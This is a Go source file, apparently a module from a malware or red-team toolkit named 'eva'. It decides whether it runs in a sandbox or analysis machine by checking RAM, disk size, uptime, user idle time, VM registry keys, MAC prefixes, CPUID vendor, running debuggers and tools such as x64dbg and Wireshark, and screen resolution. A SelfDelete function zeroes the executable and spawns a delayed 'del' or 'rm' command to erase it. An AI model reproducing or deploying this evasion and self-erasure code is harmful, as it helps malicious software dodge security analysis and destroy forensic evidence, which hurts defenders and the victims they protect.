package eva

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	THRESHOLD_RAM        = 2 * 1024 * 1024 * 1024  // 2GB
	THRESHOLD_DISK       = 64 * 1024 * 1024 * 1024 // 64GB
	THRESHOLD_UPTIME     = 30 * time.Minute
	THRESHOLD_IDLE_TIME  = 5 * time.Minute
	VIRTUAL_MAC_PREFIXES = "00:05:69,00:0c:29,00:1c:14,00:50:56,08:00:27,0a:00:27,00:16:3e"
)

type memoryStatusEx struct {
	cbSize                  uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

type diskFreeSpaceEx struct {
	FreeBytesAvailable     int64
	TotalNumberOfBytes     int64
	TotalNumberOfFreeBytes int64
}

// Declare kernel32 globally for reuse.
var kernel32 = windows.NewLazySystemDLL("kernel32.dll")

func isSandbox() bool {
	if checkCPUCores() ||
		checkSystemRAM() ||
		checkDiskSize() ||
		checkUptime() ||
		checkVirtualization() ||
		checkAnalysisTools() ||
		checkDNS() ||
		checkUserActivity() ||
		checkScreenResolution() {
		return true
	}
	return false
}

// Hardware checks ------------------------------------------------------------
func checkCPUCores() bool {
	return runtime.NumCPU() < 2
}

func checkSystemRAM() bool {
	var memInfo memoryStatusEx
	memInfo.cbSize = uint32(unsafe.Sizeof(memInfo))

	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
	if ret != 0 {
		return memInfo.ullTotalPhys < THRESHOLD_RAM
	}
	return false
}

func checkDiskSize() bool {
	var diskInfo diskFreeSpaceEx
	getDiskFreeSpaceEx := kernel32.NewProc("GetDiskFreeSpaceExW")

	rootPath, _ := syscall.UTF16PtrFromString("C:\\")
	ret, _, _ := getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(rootPath)),
		uintptr(unsafe.Pointer(&diskInfo.FreeBytesAvailable)),
		uintptr(unsafe.Pointer(&diskInfo.TotalNumberOfBytes)),
		uintptr(unsafe.Pointer(&diskInfo.TotalNumberOfFreeBytes)),
	)

	if ret != 0 {
		return diskInfo.TotalNumberOfBytes < THRESHOLD_DISK
	}
	return false
}

// System behavior checks -----------------------------------------------------
func checkUptime() bool {
	getTickCount64 := kernel32.NewProc("GetTickCount64")
	tickCount, _, _ := getTickCount64.Call()
	uptime := time.Duration(tickCount) * time.Millisecond
	return uptime < THRESHOLD_UPTIME
}

func checkUserActivity() bool {
	user32 := windows.NewLazySystemDLL("user32.dll")
	getLastInputInfo := user32.NewProc("GetLastInputInfo")
	getTickCount := kernel32.NewProc("GetTickCount")

	type lastInputInfo struct {
		cbSize uint32
		dwTime uint32
	}

	var lii lastInputInfo
	lii.cbSize = uint32(unsafe.Sizeof(lii))

	ret, _, _ := getLastInputInfo.Call(uintptr(unsafe.Pointer(&lii)))
	if ret == 0 {
		return false
	}

	currentTick, _, _ := getTickCount.Call()
	idleTime := (uint32(currentTick) - lii.dwTime) / 1000
	return time.Duration(idleTime)*time.Second > THRESHOLD_IDLE_TIME
}

// Virtualization checks ------------------------------------------------------
func checkVirtualization() bool {
	return checkVMRegistry() || checkVMMAC() || checkCPUVendor()
}

func checkVMRegistry() bool {
	keys := []struct {
		path  string
		value string
	}{
		{`SYSTEM\CurrentControlSet\Services\Disk\Enum`, "VMware"},
		{`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0`, "VMware"},
		{`HARDWARE\DESCRIPTION\System`, "SystemBiosVersion"},
	}

	for _, key := range keys {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, key.path, registry.READ)
		if err != nil {
			continue
		}
		defer k.Close()

		val, _, err := k.GetStringValue(key.value)
		if err != nil {
			continue
		}

		if strings.Contains(strings.ToLower(val), "vmware") ||
			strings.Contains(strings.ToLower(val), "virtual") ||
			strings.Contains(strings.ToLower(val), "qemu") {
			return true
		}
	}
	return false
}

func checkVMMAC() bool {
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		mac := iface.HardwareAddr.String()
		if len(mac) > 8 && strings.Contains(VIRTUAL_MAC_PREFIXES, mac[:8]) {
			return true
		}
	}
	return false
}

func checkCPUVendor() bool {
	var vendor [12]byte
	// Discard eax since it's not needed.
	_, ebx, ecx, edx := cpuid(0)
	*(*uint32)(unsafe.Pointer(&vendor[0])) = ebx
	*(*uint32)(unsafe.Pointer(&vendor[4])) = edx
	*(*uint32)(unsafe.Pointer(&vendor[8])) = ecx

	cpuVendor := string(vendor[:])
	return strings.Contains(strings.ToLower(cpuVendor), "vmware") ||
		strings.Contains(strings.ToLower(cpuVendor), "kvm") ||
		strings.Contains(strings.ToLower(cpuVendor), "qemu")
}

// Analysis tools detection ---------------------------------------------------
func checkAnalysisTools() bool {
	tools := []string{
		"ollydbg", "idaq", "windbg", "x32dbg", "x64dbg",
		"procmon", "wireshark", "processhacker", "vboxservice",
	}

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	for err == nil {
		exeName := windows.UTF16ToString(entry.ExeFile[:])
		for _, tool := range tools {
			if strings.Contains(strings.ToLower(exeName), tool) {
				return true
			}
		}
		err = windows.Process32Next(snapshot, &entry)
	}
	return false
}

// Network checks -------------------------------------------------------------
func checkDNS() bool {
	addrs, _ := net.LookupHost("microsoft.com")
	for _, addr := range addrs {
		if strings.HasPrefix(addr, "10.") || strings.HasPrefix(addr, "192.168.") {
			return true
		}
	}
	return false
}

// Display checks -------------------------------------------------------------
func checkScreenResolution() bool {
	user32 := windows.NewLazySystemDLL("user32.dll")
	getSystemMetrics := user32.NewProc("GetSystemMetrics")

	cx, _, _ := getSystemMetrics.Call(0) // SM_CXSCREEN
	cy, _, _ := getSystemMetrics.Call(1) // SM_CYSCREEN
	return cx < 1024 || cy < 768
}

// CPUID implementation -------------------------------------------------------
// cpuid locks the OS thread, calls the assembly routine and returns the registers.

func cpuid(op uint32) (eax, ebx, ecx, edx uint32) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Prevent Go from moving the stack during the assembly call.
	var buf [16]byte
	asmCPUID(unsafe.Pointer(&buf[0]), op)
	return *(*uint32)(unsafe.Pointer(&buf[0])),
		*(*uint32)(unsafe.Pointer(&buf[4])),
		*(*uint32)(unsafe.Pointer(&buf[8])),
		*(*uint32)(unsafe.Pointer(&buf[12]))
}

// Selfdelete will overwrite the file before deleting it.
func SelfDelete() {
	// Obtain the path to the current executable.
	exePath, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to get executable: %v\n", err)
		os.Exit(1)
	}

	// Get file info to determine its size.
	info, err := os.Stat(exePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to stat executable: %v\n", err)
		os.Exit(1)
	}
	size := info.Size()

	// Open the file for writing.
	f, err := os.OpenFile(exePath, os.O_WRONLY, 0)
	if err == nil {
		// Overwrite the entire file with zero bytes in 4KB chunks.
		buf := make([]byte, 4096)
		for i := range buf {
			buf[i] = 0
		}
		var written int64
		for written < size {
			remaining := size - written
			chunkSize := int64(len(buf))
			if remaining < chunkSize {
				chunkSize = remaining
			}
			n, err := f.Write(buf[:chunkSize])
			if err != nil {
				break
			}
			written += int64(n)
		}
		f.Sync()
		f.Close()
	}

	// Spawn a helper process that deletes the file after a short delay.
	if runtime.GOOS == "windows" {
		// The command waits ~2 seconds then deletes the executable.
		cmdStr := fmt.Sprintf("ping 127.0.0.1 -n 2 > NUL && del /F /Q \"%s\"", exePath)
		cmd := exec.Command("cmd", "/C", cmdStr)
		_ = cmd.Start()
	} else {
		// For Unix-like systems: sleep then remove.
		cmdStr := fmt.Sprintf("sleep 2 && rm -f '%s'", exePath)
		cmd := exec.Command("sh", "-c", cmdStr)
		_ = cmd.Start()
	}

	time.Sleep(100 * time.Millisecond)
	os.Exit(0)
}

//go:noescape
func asmCPUID(buf unsafe.Pointer, op uint32)


